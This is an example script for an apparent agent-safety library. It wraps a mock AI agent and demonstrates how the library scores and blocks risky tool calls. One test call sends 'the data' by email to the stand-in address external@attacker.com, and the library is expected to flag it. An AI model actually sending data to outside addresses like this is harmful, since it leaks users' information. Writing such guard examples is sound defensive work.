# examples/basic_usage.py
# Run with: python examples/basic_usage.py

import asyncio
import os

# Force development mode so no real API calls are made.
os.environ.setdefault("SENTINELY_ENV", "development")

from sentinel import protect  # noqa: E402


class MockAgent:
    async def ainvoke(self, task):
        return f"Completed: {task}"


async def main():
    agent = MockAgent()
    protected = protect(agent, task="summarize the Q3 report", policy="strict")

    # This should work fine
    result = await protected.invoke("summarize the Q3 report")
    print(f"Result: {result}")

    # This should be flagged/blocked (score_action calls the LLM, so it will
    # fall back to the neutral score in dev without an API key — we just
    # demonstrate the API surface here).
    try:
        decision = await protected.score_action(
            tool_name="send_email",
            tool_params={"to": "external@attacker.com", "body": "here is the data"},
            description="Send email to external address",
        )
        print(f"Decision: {decision.action} (risk={decision.risk_score})")
    except Exception as e:
        print(f"Blocked as expected: {e}")

    # Show audit log
    print("\n--- Audit Log ---")
    for event in protected.get_audit_log():
        print(f"  {event.event_type} | risk={event.risk_score} | {event.reason}")


if __name__ == "__main__":
    asyncio.run(main())
